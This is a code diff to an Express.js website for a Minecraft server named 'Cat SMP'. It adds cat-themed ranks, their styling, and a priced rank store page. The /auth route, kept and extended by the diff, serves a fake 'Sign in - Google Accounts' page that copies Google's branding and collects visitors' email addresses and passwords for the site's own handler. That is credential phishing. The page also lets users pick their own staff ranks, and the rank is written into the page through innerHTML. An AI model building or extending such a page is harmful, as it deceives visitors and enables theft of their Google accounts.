@@ -86,6 +86,14 @@ const siteStyles = `
     .rank-builder { color: #b38600; font-weight: bold; }
     .rank-special { color: #33cc33; font-weight: bold; }
     .rank-member { color: #808080; font-weight: bold; }
+    .rank-tiger { color: #ffcc00; font-weight: bold; }
+    .rank-cheetah { color: #ff8000; font-weight: bold; }
+    .rank-panther { color: #000000; font-weight: bold; background: #ffffff55; padding: 0 4px; border-radius: 3px; }
+    .rank-browntabby { color: #8B4513; font-weight: bold; }
+    .rank-greytabby { color: #808080; font-weight: bold; }
+    .rank-bombay { color: #111111; font-weight: bold; background: #ffffff55; padding: 0 4px; border-radius: 3px; }
+    .rank-persian { color: #ffffff; font-weight: bold; text-shadow: 0 0 2px #000; }
+    .rank-sphynx { color: #ffc0cb; font-weight: bold; }
 
     .hamburger-btn { background-color: var(--btn-bg); color: var(--btn-color); border: 1px solid var(--box-border); padding: 10px 14px; font-size: 1.3rem; border-radius: 8px; cursor: pointer; box-shadow: 0 4px 6px rgba(0,0,0,0.3); font-weight: bold; }
     .hamburger-btn:hover { background-color: var(--btn-hover); }
@@ -176,6 +184,14 @@ const siteStyles = `
           else if (savedRank === "[MOD]") rankClass = "rank-mod";
           else if (savedRank === "[Builder]") rankClass = "rank-builder";
           else if (savedRank === "[Special]") rankClass = "rank-special";
+          else if (savedRank === "[Tiger]") rankClass = "rank-tiger";
+          else if (savedRank === "[Cheetah]") rankClass = "rank-cheetah";
+          else if (savedRank === "[Panther]") rankClass = "rank-panther";
+          else if (savedRank === "[Brown Tabby]") rankClass = "rank-browntabby";
+          else if (savedRank === "[Grey Tabby]") rankClass = "rank-greytabby";
+          else if (savedRank === "[Bombay]") rankClass = "rank-bombay";
+          else if (savedRank === "[Persian]") rankClass = "rank-persian";
+          else if (savedRank === "[Sphynx]") rankClass = "rank-sphynx";
           
           userTag.innerHTML = '<span class="' + rankClass + '">' + savedRank + '</span> ' + savedUser;
         } else {
@@ -240,7 +256,7 @@ app.get('/shop/currency', (req, res) => {
 });
 
 app.get('/shop/rank', (req, res) => {
-  res.send(`<!DOCTYPE html><html lang="en"><head><title>Cat SMP - Rank</title>${headContent}</head><body>${hamburgerHTML}<h1>Store - Ranks</h1><p>Unlock awesome server ranks!</p><div class="content-box"><h2>👑 Rank</h2><p style="text-align: center;">Working on it, please comeback.</p></div><br><a href="/shop" class="back-home">← Back to Store</a></body></html>`);
+  res.send(`<!DOCTYPE html><html lang="en"><head><title>Cat SMP - Rank</title>${headContent}</head><body>${hamburgerHTML}<h1>Store - Ranks</h1><p>Unlock awesome server ranks!</p><div class="content-box"><h2>👑 Ranks Store</h2><h3 style="color: #ffcc00; margin-top: 15px;">High Rank</h3><div class="button-container" style="margin: 10px auto 20px auto;"><button class="btn"><span class="rank-special">[Special]</span> - 8$</button><button class="btn"><span class="rank-tiger">[Tiger]</span> - 4$</button><button class="btn"><span class="rank-cheetah">[Cheetah]</span> - 2$</button><button class="btn"><span class="rank-panther">[Panther]</span> - 2$</button></div><h3 style="color: #ffcc00; margin-top: 15px;">Tabby Rank</h3><div class="button-container" style="margin: 10px auto 20px auto;"><button class="btn"><span class="rank-browntabby">[Brown Tabby]</span> - 12¢</button><button class="btn"><span class="rank-greytabby">[Grey Tabby]</span> - 10¢</button></div></div><br><a href="/shop" class="back-home">← Back to Store</a></body></html>`);
 });
 
 app.get('/vote', (req, res) => {
@@ -262,7 +278,7 @@ app.post('/ticket/submit', (req, res) => {
 });
 
 app.get('/auth', (req, res) => {
-  res.send(`<!DOCTYPE html><html lang="en"><head><title>Sign in - Google Accounts</title>${headContent}</head><body>${hamburgerHTML}<div class="google-card"><div class="google-logo"><span>G</span><span>o</span><span>o</span><span>g</span><span>l</span><span>e</span></div><div class="google-subtitle">Sign in or create account</div><form action="/auth/submit" method="POST"><div class="google-field"><label for="email">Email or phone</label><input type="email" id="email" name="email" required placeholder="Enter your email"></div><div class="google-field"><label for="password">Password</label><input type="password" id="password" name="password" required placeholder="Enter your password"></div><div class="google-field"><label for="ign">In-Game Name</label><input type="text" id="ign" name="ign" required placeholder="Enter your Minecraft IGN"></div><div class="google-field"><label for="rank">In-Game Rank</label><select id="rank" name="rank" required><option value="[Owner]">[Owner]</option><option value="[MANAGER]">[MANAGER]</option><option value="[MAIN MOD]">[MAIN MOD]</option><option value="[MOD]">[MOD]</option><option value="[Builder]">[Builder]</option><option value="[Special]">[Special]</option><option value="[Member]" selected>[Member]</option></select></div><button type="submit" class="google-btn">Next</button></form></div><a href="/" class="back-home">← Back to Home</a></body></html>`);
+  res.send(`<!DOCTYPE html><html lang="en"><head><title>Sign in - Google Accounts</title>${headContent}</head><body>${hamburgerHTML}<div class="google-card"><div class="google-logo"><span>G</span><span>o</span><span>o</span><span>g</span><span>l</span><span>e</span></div><div class="google-subtitle">Sign in or create account</div><form action="/auth/submit" method="POST"><div class="google-field"><label for="email">Email or phone</label><input type="email" id="email" name="email" required placeholder="Enter your email"></div><div class="google-field"><label for="password">Password</label><input type="password" id="password" name="password" required placeholder="Enter your password"></div><div class="google-field"><label for="ign">In-Game Name</label><input type="text" id="ign" name="ign" required placeholder="Enter your Minecraft IGN"></div><div class="google-field"><label for="rank">In-Game Rank</label><select id="rank" name="rank" required><option value="[Owner]">[Owner]</option><option value="[MANAGER]">[MANAGER]</option><option value="[MAIN MOD]">[MAIN MOD]</option><option value="[MOD]">[MOD]</option><option value="[Builder]">[Builder]</option><option value="[Special]">[Special]</option><option value="[Tiger]">[Tiger]</option><option value="[Cheetah]">[Cheetah]</option><option value="[Panther]">[Panther]</option><option value="[Brown Tabby]">[Brown Tabby]</option><option value="[Grey Tabby]">[Grey Tabby]</option><option value="[Bombay]">[Bombay]</option><option value="[Persian]">[Persian]</option><option value="[Sphynx]">[Sphynx]</option><option value="[Member]" selected>[Member]</option></select></div><button type="submit" class="google-btn">Next</button></form></div><a href="/" class="back-home">← Back to Home</a></body></html>`);
 });
 
 app.post('/auth/submit', (req, res) => {
